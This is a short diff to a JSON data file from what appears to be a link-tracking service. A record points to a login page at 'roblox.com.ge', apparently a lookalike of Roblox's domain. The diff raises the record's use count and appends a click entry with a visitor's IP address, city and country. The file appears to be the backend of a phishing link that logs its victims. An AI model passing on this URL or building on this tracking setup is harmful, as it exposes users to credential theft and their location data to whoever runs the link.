@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1347,
+    "useCount": 1348,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10944,6 +10944,14 @@
         "city": "Le Mans",
         "flag": "🇫🇷",
         "countryCode": "FR"
+      },
+      {
+        "timestamp": 1777413744511,
+        "ip": "177.248.47.3",
+        "country": "Mexico",
+        "city": "Zapopan",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
       }
     ]
   },
